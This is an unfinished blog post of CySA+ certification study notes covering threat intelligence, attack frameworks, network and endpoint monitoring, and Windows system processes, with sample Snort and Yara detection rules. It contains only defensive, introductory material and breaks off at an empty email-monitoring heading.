---
title: CySA+ Study Content
author: AdriÃ 
date: 2023-01-07 14:10:00 +0800
img_path: /img/posts/2023-01-07-CySA/
categories: [CySA, Certifications, BlueTeam]
tags: 
math: true
render_with_liquid: false
---

In this post I want to group all the content related with the CySA certification that I considere important and worth to keep in this site. I want to clarify that some important content may not be added because I feel that I already know and it is not worth to spend that extra time. 

---

> This post is not finished yet!
{: .prompt-danger}

# Threat Intelligence Sharing

## Security vs Threat Intelligence

**Security Intelligence** is the process through which data generated in the ongoing use of systems is collected, processed, analyzed and disseminated in order to provide a security status of those systems. 

**Threat Intelligence** is the process of collecting, investigating, analyzingand disseminating information about emerging threats to obtain an external threat landscape.


## Intelligence Cycle

Security intelligence is a process. You can see diferents schemas in the internet and they may be a bit different (some of them group steps into a unique step), but the overall idea is the same. 

![Intelligence Cycle](intell-cycle.png)

1. **Requirements, Planning and Direction:** In this phase the goals for the intelligence gathering effort/cycle is set. 
2. **Collection and Processing:** The **collection** of the data can be done by software tools and SIEMs. Afterwards, this data is **processed** using **Data Enrichment** processes with the goal to keep relevant data. 
3. **Analysis:** The **analysis** of the processed data is performed against the use cases decided from the **Requirements, Planning and Directon** phase. This step can make use of auto model analysis, using machine learning and artificial intelligence.  
4. **Dissemination:** In ths phase the results obtained by the analysis is published to consumers so other teams can take action. Thei can be classified using the type of intelligence they refere:
	- Strategic Intelligence: related with broad things and objectives. They are usually reports to executives, power point slides, etc.
	- Operational Intelligence: Adresses the day to day priorities of the specialists. 
	- Tactical Intelligence: They refere to real time decisions, like alerts detected by the SOC. 
5. **Review/Feedback:** This phase aims to clarify the requirements and improve the the Collection, analysis and dissemination phases for the next cycle by reviewing the current inputs and outputs. Usually the feedback phase takes into account: 
	- Lessons learned
	- Measurable success
	- Evolving threat issues

## Intelligence Sources

The **Collection and Processing** step of the Intelligence Cycle, we have to analyze the sources that are used to obtain the data. We should considere this properties of the sources and data: 

- Timeliness: Property of a source that ensures that it is up-to-date.
- Relevancy: Property of a source that ensures that it matches the use cases intended for it and that the data that the source provides is relevant. 
- Accuracy: Property of a soruce that ensures that the results are accurate and effective. 
- Confidence Levels: Property of a source that ensures the produced statements are reliable. 

The places where we obtain the data can also be classified: 

- Proprietary: Comercial services offering acces to updates and research data.
- Close-source: Data obtained from the own provider's research. 
- Open-Source:  Public available data from public databases. 
	- US-CERT
	- UK NCSC
	- AT&T Security
	- **MISP (Malware Information Sharing Point)**
	- Virus Total
	- Spanhaus
	- SANS ISC Suspicious Domains

**OSINT** are the methods to obtain information through public records, websites, and social media. We will talk about it [later](#threat-hunting). 

## ISACS: Intelligence Sharing and Analysis Centers

The ISAC is a non-profit group set to share sector-specific threat intelligence and security best practices (CISP is the same but in the UK). There are diferent types of ISACS, classified using the sector: 
	- Critical Infrastructure
	- Goverment
	- Healthcare
	- Financial
	- Aviation
## Threat Intelligence Sharing (within the organitzation)

In the **Dissemination** phase, is important to share the information with the corresponding teams to act according to the situation (make use of the data).

- Risk Management: Identify, evaluate and prioritizes threats and vulnerabilities to reduce the impact. 
- Incident Response: Organized approach to address security-breach/cyber-attacks.
- Vulnerability Management: Identify, classify and prioritize software vulnerabilities. 
- Detection and Monitoring: The practice of observing to identify anomalous patterns to analyze them further. 

--- 
# Classifying Threats

## Types of Malware
- **Commodity Malware:** This type of malware is available to purchase or it is free. They exploit a known vulnerability. Is used by a wide range of threat actors. 
- **Zero-day:** Malware that exploits a zero-day vulnerability, which means that is a vulnerability that has just been discovered. 
- **APT - Advance Persistent Threats:**They are usually performed by Organized Crime and once they obtain access, they mantain it in order to obtain information. The information is obtained by the malware and sent to the *Command and Control (C2)*, a infrastructure of hosts and services with which the attackers direct, distribute and control the malware over bots/zombies (botnets). 

## Threat Research

Threats used to be identifyed by a signature (part of the threat that is re that allowed them to be recognizable). However, obfuscating techniques have become better and searching for the signature is no longer the best option. Some different ways to identify threats can be: 
- **Reputational Threat Research:** This consists of a blacklists of known threat sourcesn like signatures, IP addresses ranges and DNS domains. If something is dettected comming from thoose sources, is classified as a threat. 
- **Indicator of Compromise (IOC):** Thoose are residual signs that an asset or network have been compromised (or is beeing attacked). Modified files, excessive bandwith, unknown port ussage and suspicious emails can be IOC. If the attack is still going on, instead of saying it is a IOC, we will say it is a Indicator of Attack (IOA). 
- **Behavioral Thread Research:** This detection technique is based on Tactics, Techniques and Procedures used by the threats. They correlate the IOC with attack patterns. Some examples can be: 
	- DDoS
	- Viruses and Worms
	- Network Reconnaissance
	- APT
	- Data Exfiltration

The C2 that the APT's use may do **Port Hopping** technique in order to use different ports and make them more difficult to detect. Another technique that they may use is **Fast Flux DNS**, which consists on changing the IP address associated with a domain frequently.  

## Attack Frameworks

A **Kill Chain** is a framework that was first introduced by Lockheed Martin (military US company) and it describes the stages bw which a threat actor progresses in a network intrusion attack. 

1. Reconnaissance: The attacker determines the methods that will be used to continue with the attack by gathering information about the victim. It can be used Passive or Active information gathering. 
2. Weaponization: This is the step were the malware/exploit is developed considering the detected vulnerabilities. 
3. Delivery: In this step the method that will be used to introduce the attack will be identified. 
4. Explotation: This step occurs when the exploit/malware is successfully introduced. 
5. Installation: When the malware gets executed, this step allows to obtain a remotr access tool to the victim and achieve persistance. 
6. Comand and Control (C2): Establish a outbound channel to a reomote server (botnet) to progress withthe attack. 
7. Actions on Objectives: Attackers make use of the access achieved to collect what they want. 

The **MITRE ATT&CK Framework** is a knowledge base that consist of a matrix where different tactics and techniques used by the attacers are described. You can check it here <https://attack.mitre.org/matrices/enterprise/>. 

Last but not least, we have the **Diamond model of Intrusion Analysis**. This framework analyzes the security incidents by exploring the relationship between four features: adversary, capability, infrastructure and victim. This is a complex model, that can also help to create Activity Threads and Activity Attack Graphs. Fore a more detailed information, I suggest reading this post: <https://www.socinvestigation.com/threat-intelligence-diamond-model-of-intrusion-analysis/>. 

## Indicator Management

It is important to use a normalized way when sharing information about threats. 

**STIX (Structured Thread Information eXpression)** is a standar terminology for IOCs and a way to indicate relationships between them. It is expressed in JSON. It has objects that contain multiple attributes with their corresponding value: 
	- Observed Data
	- Indicator
	- Attack Patterns
	- Campaign agains threat actor
	- Courses of Action (mitigation techniques used to reduce the attack)

**TAXII (Trusted Automated eXchange of Indicator Information)** is a protocol for supplying codified information to aoutomate incident detectiond and analysis. The analysis tools provide updates of the threats using this protocol. 
![TAXII protocol](taxii.jpg)

**OpenIOC** is a framework that uses XML files for supplying codified information to automate indicent detection. 

**MISP (Malware Information SHaring Protocol)** provides a server platform that allows cyber intelligence sharing. It supports OpenIOC definitions and can receive and send information using STIX over the TAXII protocol. 

---
# Threat Hunting

Threat hunting is a technique designed to detect presence of threats that have not been discovered by normal security monitoring. Is also less disruptive than a penetration test. 
## Threat Modeling 

Threat modeling is a structured approach to identifying potential threats and vulnerabilities in a system, network, or application. The goal of threat modeling is to understand the potential attack vectors and to identify and prioritize the risks associated with them. This process typically involves:
- Identify the attack vectors 
- The impact of the attack in terms of confidentiality, integrity and availability of the data
- Identify the likelihood of the attack to occur
- What mitigations can be implemented

The information gathered during threat modeling can then be used to inform security design and implementation decisions.

The **Adversary Capability** can be classified to determine de resources and expertise availabe by the threat actor: Aquired and augmented, Developed, Advanced and Integrated

The **Attack Surface** can be classified to determine the points where a network or app receives external connections that can be exploited: Holistic network, Websites and cloud-services and Custom software applications. 

The **Attack Vector** is the methodology used by the attackers to gain acces to the network or exploit a gain unauthorized acces: Cyber, Human and Physical. 

The **Likelihood** is the chance of a threat being exploited. 

The **Impact** is the cost of a security incident. Usually expressed in cost (money). 

## OSINT (Open-Source Intelligence)

All the public information and tools that can be used by the attacker to obtain specific data about a victim is classified as OSINT. It can allow the attacker to develop a stretegy for compromising the victim. [_Here_](https://osintframework.com/) you can find all the OSINT framework with different tools that can be used and public information. 

Some of the most used and know ones are: 

- **Google Hacking**: Use Google search advance operators ("", NOT, AND/OR, and keywors to determine the scope of the search, such as _site, flietype, related,..._) to locate desired information. You can visit the [Google Hacking Database](https://www.exploit-db.com/google-hacking-database) to obtain usefull queries. 

- **Shodan**: shodan.io is a search engine optimized for identifying vulnerable Internet-attached devices. It can allow you to search, for example, open ssh ports facing the internet without having to do an active scan.

- **Profiling Techniques** such as Email Harvesting can be used to try to guess valid and existing email addresses for a specific domain. 

- **Harvesting Techniques** such as _whois_ command, DNS Zone Transfer (method that asks for a replicated DNS database across a set of DNS servers that will reply if they are missconfigured) and DNS/Web Harvesting are other OSINT tools used to gain information about subdomains, source code, hosting providers, comments in the website code, etc. 

> If you want to know more about OSINT and passive information gathering, you can read this other post [Passive Information Gathering](https://adriapt.github.io/posts/OSCP-6/) that I wrote when I was studying for the OSCP certification.
{: .prompt-tip }    

# Network Forensics

## Tools 

In order to analyze network traffic, it must be captured and decoded. 

- **Switched Port Analyzer (SPAN):** This is a feature that can be activated in a switch. This feature, also known as port mirroring, makes a copy of the traffic seen on a single port or multiple ports and sends the copy to another port (usually a monitoring port which will process the packets).

- **Packet Sniffer:** This can be a fisical debice connected to a network or a software program that uses records data frames as they pass over the network. Deppending on the placement of the sniffer inside the network, it will be able to sniff more or less data. 
	- Wireshark and tcpdump are software programms that can be used to sniff traffic. 

## Flow Analysis  

There are different ways to analize the flow that you capture: 

- **Full Packet Capture (FPC):** The entire packet is captured (header+payload).
- **Flow Collector:** It just records mettadata and statistics about the traffic blow, but not the traffic itself. 
	- **NetFlow:** This is a standard developed by CISCO and is used to report the nerwork flow into a structured database. It includes: 
		1. Network protocol interface
		2. Version and type of IP 
		3. Source and destination IP
		4. Source and destination port
		5. IPs ToS (Type of Service)
- **Zeek:** This is a hybrid tool that monitors the network in a passive form and only logs relevant data. The events are stored in JSON format. 
- **Multi Router Traffic Grapher (MRTG):** This tool creates graphs that show traffic flows through the network interfaces of routers and switches by using SNMP (Simple Network Management Protocol). 

## IP and DNS Analysis

There are **Known-bad IP/DNS addresses**, which are range of addresses taht appears in blackists and can help to detect if the traffic is malicious.  

Recent malware uses **Domain Generation Algorithms (DGA)** to evade blackists. The purpose of a DGA is to make it harder for security researchers and network defenders to identify and block the C2 servers used by the malware.

The algorithm usually uses a seed value and an algorithm to generate a large number of domain names. The seed value can be based on a specific date, time or some other value that is known to both the malware and the C2 server. The algorithm then generates a large number of domain names by applying the seed value to the algorithm.

Some of the common techniques used by DGA are:

    Using a predefined set of words or characters and applying mathematical operations to them.
    Using encryption functions to generate domain names.
    Using a combination of words or characters that are unlikely to be registered by legitimate domain owners.

Once the domain names are generated, the malware will try to connect to each one of them in a specific order, until it finds the C2 server. The C2 server will then be used to download additional malware, exfiltrate data, or receive commands.

![DGA](dga.jpg)

A **Fast Flux Network (FFN)** is another method used by the malware to avoid being detected. FFN is a type of botnet that uses a technique to hide the true location of a command-and-control (C2) server by constantly changing the IP address associated with a specific domain name using a technique known as "fast flux" where the IP address associated with the domain name changes frequently. The malware infects a large number of machines and turns them into "proxies" for the C2 server. The main goal of a FFN is to evade detection by making it difficult to identify and block the C2 server used by the malware. 

## URL Analysis 

Another way to detect a possible attack is to perform a URL Analysis. 

Percent-encoding, also known as **URL encoding**, is a technique used to encode special characters, such as spaces, slashes, and ampersands, that are not allowed in URLs so that they can be transmitted safely. It replaces these characters with a percentage sign followed by the ASCII code of the character in hexadecimal form. This technique is also important for preventing cross-site scripting (XSS) attacks by encoding special characters that could be used in an XSS attack so that they are not executed by the browser.

Here you can find a list with the more usefull ones: 

| Symbol Representation  | Encoding |
|-----------------------|----------|
| " " (Space)           | %20      |
| "&" (Ampersand)       | %26      |
| "+" (Plus)            | %2B      |
| "," (Comma)           | %2C      |
| "/" (Forward slash)  | %2F      |
| ":" (Colon)           | %3A      |
| ";" (Semi-colon)      | %3B      |
| "=" (Equals)          | %3D      |
| "?" (Question mark)   | %3F      |
| "@" (At sign)         | %40      |
| "$" (Dollar sign)     | %24      |
| "#" (Pound sign)      | %23      |
| "<" (Less than)       | %3C      |
| ">" (Greater than)    | %3E      |
| "'" (Single quote)    | %27      |
| """ (Double quote)    | %22      |

---
# Network Monitoring 

## Firewalls

Firewall Logs keep a lot of usefull data that can be used to detect suspicious behaviour. They keep the connections that have been alowed or denyed, the protocols used, the bandwith usage, NAT/PAT translation, etc. The rules that the firewall will follow for deciding the permitted and denied connections will be defined in the **Access Control List (ACL)**

The format of the logs will be vendor specific: 

- **iptables** 
	This is a Linux based firewall that uses the syslog file format to store the data. The logs have a code that can help to identify the severitoy of log.
	
|Code  | Severity    | Description                                                 |
|-------|-------------|-------------------------------------------------------------|
| 0     | Emergency   | The system is unusable.                                      |
| 1     | Alert       | Action must be taken immediately.                            |
| 2     | Critical    | Critical conditions.                                         |
| 3     | Error       | Error conditions.                                            |
| 4     | Warning     | Warning conditions.                                         |
| 5     | Notice      | Normal but significant condition.                            |
| 6     | Informational| Informational messages.                                      |
| 7     | Debug       | Debug-level messages.                                        |

- **Windows Firewall**
	It uses W3C Extended Log File Format. This is  a format used by web servers to record information about requests made to the server, while syslog is a standard used to send log messages from network devices to a centralized log server.


When a Firewall is under-resourced and logs can't be collected fast enough, an attacker could exploit this by sending a lot of thata and overwhelming the firewall, hence the traffic can't be collected properly nor detect unauthorized access. This is known as a **Blinding Attack**

## Firewall Configurations

It is important to study where the Firewall will be placed in the network. However, this will be diffent for each use case. 

- **Demilitarized Zone DMZ**: If your network has servers that exposes services (like web pages) to the Internet, they are usaly in a independent subnetwork, isolated from the internal network of the company. Since thoose services are exposed to the Internet, are more vulnerable and is important to add a separation between them and your other servers/workstations. This DMZ zone usually has a Firewall facing the internet, allowing trafic related with the services exposedand  another one between the DMZ and the internal network, more restrictive.
 
![DMZ](DMZ.png)

It is also important that the ACLs are processed from top-to-bottom, this means that the most specific rules have to be in the top and the generall ones at the end. Some principles for a good ACL configuration are: 
1. Block incoming requests from private, loopback and multicast IP address ranges. 
2. Block protocols that should only be used locally and not received from the internet, like: ICMP, DHCP, OSPF, SMB. 
3. Authorize just known hosts and ports to use IPv6

A firewall can **DROP** a packet or **REJECT** it. When the deny rule **REJECTS** the packet, it explicitly sends a response saying that the traffic has been rejected. However **DROPPING** it will just ignore the packet and the sender won't receive any answer, which will difficult the work (for example, mapping the ports and network) if it is a malicious adversary.  Dropping can be used to create a **Black Hole** and avoid DoS and DDoS attacks by sending the traffic to the null0 interface and not sending a response. 

You can also configure your Firewall to send to the **Black Hole** all unused IP addreses within your network, because they should not be used, and if usage is dettected it is unauthorized. 

A **Sinkhole** is like a **Black Hole** but instead of sending the traffic to the null0 interface, it is redirected to another subnet for further investigation. 


Is also important to observe the eggress traffic. A host could have been infected by malware and communicating with the internet (Comanda and Control servers). Best practice for configuring egress traffic are: 
1. Allow whitelisted apps, ports and destination addresses
2. Restrict DNS lookups to trusted DNS services
3. Block access to known bad IP address ranges (blacklist)
4. Block all internet access from host that don't use internet


## Proxy Logs

A proxy is a server that acts as an intermediary between a client and another server (e.g., a web server). It can be a Forward or Reverse proxy, and they can also be transparent and Nontransparent. 

- **Forward Proxy**: A forward proxy is a proxy that is used by a client to access resources on a remote server. The client sends a request to the forward proxy, which then forwards the request to the remote server, and returns the server's response to the client. Imagine a company that makes all its workstations to go through a proxy before going to the internet. This situation will imply a forward proxy. 

- **Reverse Proxy**: A reverse proxy is a proxy that is used by a server to handle client requests. It is the reverse situation from the forward proxy. Instead of forwarding packets from the clients to the servers, it collects packets received through the internet and redirects to different servers according to the situation. 

A **nontransparent** proxy is the proxy that has to be configured in the client browser, specifying the proxy IP and port (for example Burpsuite). A **transparent** proxy is a type of proxy server that intercepts and forwards requests and responses to the intended destination without the client being aware of it. It is used for caching frequently requested content, blocking certain types of content, translating IP addresses for clients on a private network to access the internet, and requiring authentication for access control. The client does not need to be configured to use it as it operates in a transparent mode.

Proxy Logs can be analyzed searching for indicators of attack.
![Proxy](proxy.png)

## Web Application Firewall Logs (WAF)

A Web Application Firewall (WAF) is a security tool that protects web applications from malicious attacks by analyzing incoming traffic and comparing it to predefined rules or patterns. If the traffic matches a known attack, such as SQL injection, XML injection, XSS, DoS, etc. the WAF takes action to block the request. It can be implemented as software or hardware, and can be a standalone solution or part of other security products.

Usually the WAFs store their logs in JSON format and they contain: 
	- Time of event
	- Severity of event
	- URL parameters
	- HTTP method used
	- Context for the rule

## Intrusion Detection System (IDS)

An IDS is a type of security software or hardware that is designed to detect and alert on unauthorized access or malicious activity on a computer network or system.

IDS systems work by continuously monitoring network traffic for suspicious patterns, anomalies, or known malicious activity. They can be set up in two different ways:

**Network-based IDS (NIDS)**: These systems monitor all the traffic that flows through a network, looking for suspicious activity. They are placed at strategic points in the network to monitor traffic from all devices connected to the network.

**Host-based IDS (HIDS)**: These systems monitor the activity on a single host or device, such as a server or a workstation. They are installed on the host itself, and monitor the system logs, process activity, and other data to detect any suspicious activity.

When an IDS detects suspicious activity, it generates an alert or alarm, which can be used to alert network administrators or trigger an automatic response, such as blocking the offending IP address or shutting down the affected service.

## Intrusion Prevention System (IPS)

An IPS is a security technology that is similar to an IDS, but with the added capability to take action to prevent unauthorized access or malicious activity on a computer network or system.
The actions that an IPS can take include:
- Blocking traffic from a specific IP address or network
- Closing a specific network port
- Quarantining a device on the network
- Logging off a user

An IPS is considered more advanced than an IDS, as it can prevent malicious activity from occurring in real-time, rather than just detecting it and raising an alert. However, it's important to note that IPS systems, like any other security device, can produce false positives and negatives, so it's crucial to have a well-configured and fine-tuned system to maximize its effectiveness.


**Snort** is an open-source, free, and widely-used Intrusion Detection and Prevention System (IDPS) tool. It can be used as both a network-based IDS (NIDS) and a host-based IDS (HIDS) depending on the configuration.

Snort uses a rule-based language to define what it should look for when scanning network traffic. Each rule is made up of several different parts, including:
- **Action**: This is the first part of the rule, and it specifies what action Snort should take when the conditions specified in the rule are met. For example, an action can be "alert", "log", "pass", "activate", "dynamic" among others.
- **Protocol**: This specifies the protocol that the rule applies to, such as TCP, UDP, or ICMP.
- **Source and destination IP addresses**: These specify the IP addresses that the rule applies to. They can be either a specific IP address or a range of IP addresses.
- **Source and destination ports**: These specify the ports that the rule applies to. They can also be either a specific port or a range of ports.
- **Direction**: This field specifies the direction of the rule, either "->" (from source to destination) or "<>" (bidirectional).
- **Options**: This field is used to specify additional conditions that Snort should look for, such as specific content in the packet, specific flags set in the packet header, or specific values in the packet payload.
- **Message**: This field is used to specify a message that will be displayed when the rule is triggered.

An example of a Snort rule:
```
alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"SSH Brute Force"; flow:to_server,established; 
threshold:type limit,track by_src,count 2,seconds 1; classtype:attempted-recon; sid:10000001; rev:1;)
```
This rule will trigger an alert when it detects a TCP connection coming from the external network to the home network on port 22 (SSH) with the message "SSH Brute Force". It's also configured to track the connection by source IP and only trigger the alert when it detects 2 connections in 1 second.

## Network Access Control (NAC) Configuration 
Network access control (NAC) provides the means to authenticate users and evaluate device integrity before a network connection is permitted. 

**IEE 802.1X** is a standard for port-based Network Access Control (NAC) that provides a framework for authenticating and controlling access to a network. It is commonly used in wireless networks and wired Ethernet networks to provide a secure connection for devices.

The 802.1X protocol works by using a supplicant (the device that wants to connect to the network) and an authenticator (a network device such as a switch or wireless access point) to establish a secure connection.

The basic process for 802.1X authentication is as follows:
1. The supplicant (device) attempts to connect to the network.
2. The authenticator (switch or Access Point) receives the connection attempt and sends an EAP-Request/Identity message to the supplicant, requesting the device's credentials.
3. The supplicant sends an EAP-Response/Identity message containing the device's credentials (such as username and password) to the authenticator.
4. The authenticator forwards the credentials to an Authentication Server (using RADIUS protocol) to verify the device's identity.
5. The Authentication Server verifies the credentials and sends an EAP-Response message indicating whether the device is authorized to access the network.
6. If the device is authorized, the authenticator sends an EAP-Success message to the supplicant, allowing the device to access the network.

802.1X also supports other types of authentication methods, such as certificate-based authentication and token-based authentication, in addition to the username and password based authentication.

All the steps above use EAP messages. However, the communication between the Supplicant and the Authenticator uses EAPOL and the communication between the Authenticator and the Authenticatos Server uses RADIUS. 

In summary, **EAP (Extensible Authentication Protocol)** is a framework that defines a standard way to provide authentication and security for wireless networks, **EAPOL (EAP over LAN)** is a network protocol that is used to carry EAP messages over LANs, and **RADIUS (Remote Authentication Dial-In User Service)**  is a network protocol that is used to authenticate and authorize users attempting to connect to a network. Together, these protocols provide a flexible and secure way to authenticate and control access to a network using 802.1X.

![802.1X](802.1X.png)
---
# Endpoint Monitoring 

A endpoin monitoring is a tool that monitors the performance and status of various devices and systems. They are different from the network monitoring tools because this tools are situated in the endpoint devices instead of the network. 

Some tools that are consdered endpoint monitoring tools are: 

- **Antivirus**: Software capable of detecting and removing virus infections and other type of malware, such as worms, Trojans, rootkits, adware, spyware, etc.
- **HIDS and HIPS**: This are the Host-Based versions of the IDS and IPS and instead of analyzing the network behaviour, they analyze the host where they are based on. 
- **Endpoint Protection Platform (EPP)**: EPP are software agents systems tht performs multiple tasks such as Anti Virus, HIDS, firewall, DLP, etc. 
- **Endpoint Detection and Response (EDR)**: Software agent that collects logs from the system and can provide early detection of threats.
- **User and Entity Behaviour Analytics (UEBA)**: System powered by Artificaial Intelligence models that can identify suspicious activity  

## Sandboxing

A sandbox is a computer enviroment isolated from the host system to guarantee that the enviroment is controlled and secured. This sandbox enviroment is usually a virtual machine and should not be used for any other purpose except malware analysis.

## Reverse Engineering

Reverse engineering is the process of analyzing a product or system to understand its design, internal structure, and functionality in order to identify vulnerabilities, create compatible products, or understand how it works. It is commonly used in software, hardware, and malware analysis by security researchers, developers, and companies to improve their own products.

Malware writers often obfuscate the code before it is assembled or compiled to prevent analysis

In order to do malware reverse engineering, some skills and tools are required, like a **dissasembler** and a **decompiler**. A **disassembler** is a tool that takes machine code (i.e., the binary code that is executed by a computer) and converts it into **assembly code**. **Assembly code** is a low-level programming language that is specific to a particular architecture and is composed of instructions that are directly executed by the CPU. **Disassemblers** are used to examine the inner workings of a program, such as the instructions and data structures it uses, and to understand how it interacts with the operating system and other software. They are also used to debug the code and locate potential vulnerabilities.

A **decompiler**, on the other hand, is a tool that takes **compiled code** (i.e., machine code or bytecode) and converts it into a higher-level programming language, such as C or Java. The main objective of decompiling is to recover the source code that was used to create the compiled code. **Decompilers** are used to understand the logic of the code, the algorithms used, and the overall design of the software. They are also used to recover lost or missing source code.

---
> **Nice to know information**
{: .prompt-info }

* A magic number is a special sequence of bytes that is used to identify the file format of a file. These sequences are also known as "file signatures" or "magic bytes". They are typically located at the beginning of a file and are used by operating systems and applications to determine the type of file.

For example, a magic number for a PNG image file is `89 50 4E 47 0D 0A 1A 0A`, which is the first eight bytes of the file. When a program or an operating system reads this sequence of bytes from the beginning of a file, it knows that this file is a PNG image. Similarly, the magic number for a ZIP file is `50 4B 03 04`, which indicates that the file is a ZIP archive.

* A program packer is a utility used to compress and encrypt executable files in order to make them smaller and more difficult to reverse engineer. They are commonly used to protect software from piracy and to make it harder for attackers to find vulnerabilities by reverse engineering the code. Packers work by compressing and encrypting the file and include a small piece of code called the "unpacking stub" which decompresses and decrypts the file when it is run. Different packers use different algorithms and encryption methods and the security of a packed file depends on the strength of the encryption and compression algorithm used.

----
## Malware Explotation 

When talking about malware, the **exploit technique** is the specific method that the malware used to infect the host. They usually use a **Dropper** and a **Downloader**. The dropper is the malware designed to install or execute other malware embedded in a payload. The downloader is part of the code that connecs to the Internet to retreive additional tools after the initial infection by a dropper. 

**Code injection** is a technique used by attackers to inject malicious code into a legitimate program or process to gain unauthorized access or perform malicious actions. There are several types of code injection attacks, such as buffer overflow, SQL injection, RCE, and DLL injection (Dynamic Link Library). These attacks can be used to gain access to sensitive information, steal data, install malware, or take control of the system. Mitigations include using secure coding practices, input validation and patching vulnerabilities in a timely manner. Masquerading is another technique used by attackers to make a malicious file or program appear as a legitimate one by modifying the file name, file extension or by adding a digital signature to the file. 

A **hollowed process** is a technique used to create a new instance of a legitimate process and then replace the process' memory with malicious code. The goal of this technique is to evade detection by security software by running the malicious code in the context of a legitimate process.

## Behavioral Analysis

Behavioral-based techniques are used to identify infections by analyzing the behavior of a system or process, rather than relying on the code or signature of the malware. Some common behavioral-based techniques used to identify infections include:
- **Anomaly detection:** This technique compares the current behavior of a system or process to a known baseline, and any deviation from the baseline is flagged as suspicious.
- **Signature-less detection:** This technique uses machine learning models to identify patterns of behavior that are indicative of malware. It does not rely on the malware's code or signature.
- **Heuristics:** This technique uses a set of rules or guidelines to identify suspicious behavior. For example, a process that attempts to access a sensitive file or registry key may be flagged as suspicious.
- **Sandboxing:** This technique runs the suspected malware in a controlled environment, such as a sandbox, where its behavior can be observed and analyzed.
- **Behavioral monitoring:** This technique monitors the system for suspicious activity, such as changes to the file system, registry, or network connections.
- **Fileless malware detection:** this technique detect malware that doesn't write files on the disk, but it runs in memory, so it's difficult to detect, but behavioral-based techniques can detect this type of malware.

---
> **Nice to know information**
{: .prompt-info }

* **Windows Registry:** The Windows Registry is a hierarchical database that stores configuration settings and options for the operating system and for applications that run on the Windows platform. It contains information such as user preferences, installed software, system settings, and hardware configurations. It is organized into keys and values and is used by the operating system and by applications to store and retrieve configuration information. However, it is important to be cautious when modifying the registry as incorrect modifications can cause system instability and crashes. It is recommended to backup the registry before making any changes.

* **Sysinternals:** The Sysinternals suite includes a variety of tools that can be used for system administration, troubleshooting, and security. Some of the most popular tools include:
	- Process Explorer: a task manager replacement that provides detailed information about processes, including memory usage, open files, and network connections.
	- Autoruns: a tool that displays all the programs and services that run automatically when the system starts.
	- TCPView: a tool that displays a detailed view of all TCP and UDP endpoints on the system, including the process that owns the endpoint.
	- PsTools: a set of command-line utilities for managing processes and services on remote systems.
	- RootkitRevealer: a tool that detects hidden processes, files, drivers, and registry keys that are associated with rootkits.
	- PageDefrag: a tool that defragments the paging file and the registry, as well as the master file table (MFT) of NTFS volumes.

* **System Idle and System:** PID 0 is assigned to the System Idle Process, a special process that runs when the computer has no other tasks to perform and consumes any unused CPU cycles. It is used by the operating system to measure the amount of idle time. PID 4 is assigned to the System process, a special process that runs at the highest privilege level and provides system-level services such as managing system resources and creating/terminating other system processes. Both processes are critical for the proper functioning of the operating system and should not be terminated or interfered with.

* **Clientt Server Runtime SubSystem:** **csrss.exe** (Client/Server Runtime Server Subsystem) is a legitimate system process that is responsible for managing certain aspects of the Windows operating system, such as creating and deleting threads and managing the Windows subsystem. It is essential for the proper functioning of the operating system and runs as a background process with minimal impact on system performance. However, malware can also use the same name for their malicious processes, so it is important to verify the location (C:\Windows\System32\csrss.exe) and the signature of the process. Terminating or interfering with the csrss.exe process can cause instability and crashes in the operating system, it is not recommended.

* **WININIT:** **winit.exe** is a Windows process that is responsible for managing the initialization of the operating system, it is responsible for starting the first processes after the system boots, such as the Windows shell (explorer.exe). It is a legitimate system process and it is located in the C:\Windows\System32 folder, but it is not commonly seen in the task manager, it should only have one instance and it should not be terminated.

* **Services.exe:** **Services.exe** is a Windows process that is responsible for managing system services in the operating system. It is a legitimate system process and it is located in the C:\Windows\System32 folder. Services.exe is responsible for starting, stopping, and controlling the status of services on the computer. Services are background processes that run on a computer, they perform a variety of tasks such as managing the network, security, or hardware. Services can be configured to start automatically when the system boots, or they can be started and stopped manually. Services will be started by the SYSTEM, LOCAL SERVICE, or NETWORK SERVICE accounts.

* **Local Security Authority SubSystem:** **lsass.exe** (Local Security Authority Subsystem Service) is a Windows process that is responsible for enforcing the security policy on the computer, it is responsible for managing user authentication and authorization, as well as providing security to the system by validating user credentials and managing access to system resources. It should only have one instance and it has to be a child of wininit.exe.

* **WINLOGON:** **winlogon.exe** (Windows Logon Application) is a process in the Windows operating system that is responsible for managing the logon and logoff process for a user, it is the process responsible for showing the user the logon screen, where the user inputs their credentials, and it also responsible for loading the user profile and starting the shell (explorer.exe) after a successful logon.

* **USERINIT:** **userinit.exe** is a Windows process that is responsible for initializing the user profile when a user logs on to the system. This process is responsible for starting the Windows shell (explorer.exe) and running any startup programs specified in the user's profile. You should only see this process briefly after log-on.
* **Explorer:** **explorer.exe** is the Windows process that is responsible for providing the graphical user interface (GUI) for the operating system. It creates and manages the taskbar, start menu, and desktop, and it also manages the file explorer and other shell components of the operating system.

---

## EDR Configuration

When using a Endpoint Detection Response, is important to tune it to reduce false positives. An otganitzation canuse online tools like virustotal.com to verify if a url or file has been categorized as malware by other Anti Virus, or may create custom malware signatures or detection rules using: 

- **Malware Attribute Enumeration and Characterization (MAEC) Scheme:** It is a standardized language for sharing structured information about malware that is complementary to STIX and TAXII to improve the automated sharing of threat intelligence. MAEC is often used in conjunction with the STIX (Structured Threat Information eXpression) and TAXII (Trusted Automated eXchange of Indicator Information) standards.

- **Yara:** Yara is a tool and file format that allows users to create simple descriptions of the characteristics of malware, called "Yara rules", that can be used to identify and classify malware samples. Yara rules are written in a simple language that allows users to define the characteristics of malware based on code, function, behavior, or other attributes. They are composed of a rule header and a rule body. The header includes the rule name and description, while the body includes conditions that must be met for the rule to match a given file. These conditions include properties of the file and the code. It is widely used by security researchers and incident responders for identifying and classifying malware. For example, a Yara rule that detects a specific malware family could look like this:
```
rule WannaCry_Ransomware
{
    strings:
        $WannaCry_string1 = "WannaCry"
        $WannaCry_string2 = "WannaDecryptor"
    condition:
        all of them
}
```

To secure an endpoint, a **Execution Control** tool that determines what additional software may be installed on a client or server beyond its baseline can be used. 
- Execution control in Windows: 
	- Software Restriction Policies (SRP)
	- AppLocker
	- Windows Defender Application Control (WDAC)
- Execution control in Linux: 
	- Mandatory Access Control (MAC)
	- Linux Security Module (LSM): An LSM provides a set of hooks and APIs that are integrated into the Linux kernel, and allows for the registration of security modules. These modules can be used to implement different security models, such as access control lists (ACLs), role-based access control (RBAC), and mandatory access control (MAC). Some examples of LSMs include:
		- AppArmor: A MAC system that uses profiles to define the allowed actions for a specific program or user.
		- SELinux: A MAC system that uses security contexts to define the allowed actions for a specific process or file.

---

# Email Monitoring

## Indicators Of Compromise

